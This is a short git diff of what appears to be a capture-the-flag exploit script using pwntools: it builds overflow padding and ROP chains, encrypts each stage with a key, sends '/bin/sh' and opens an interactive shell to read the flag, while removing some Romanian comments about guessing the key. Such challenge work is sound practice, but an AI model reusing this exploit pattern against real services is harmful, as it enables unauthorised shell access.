@@ -60,12 +60,6 @@ log.info(exe_rop.chain())
 # stage 1 - leak
 stage1 = "A" * 128 + "B" * 8 + exe_rop.chain() + "XXXX"
 
-
-# !!!!!!!!!!!!!!!!!!!!!!!!!!!!
-# nu inteleg deloc de ce trebuie sa criptez cu cheia aia
-# am descoperit formula prin TRIAL AND ERROR
-#len(stage1) % 10 + 0x0a +
-#msg = decrypt(stage1, len(stage1) % 100 + 0x64)
 msg = decrypt(stage1, key)
 log.info("ENC: " + msg)
 
@@ -93,7 +87,6 @@ log.info(rop.dump())
 
 stage2 = "A" * 128 + "B" * 8 + rop.chain() + "XXXX"
 
-#msg = decrypt(stage2, len(stage2) % 100 + 0x64)
 msg = decrypt(stage2, key)
 log.info("ENC: " + msg)
 
@@ -101,5 +94,6 @@ io.sendafter(":", str(len(stage2)));
 io.sendafter(":", msg)
 io.sendafter(":", str(key))
 io.send('/bin/sh\x00')
-#io.sendline('ls')
 io.interactive()
+
+# type 'cat flag' and you won
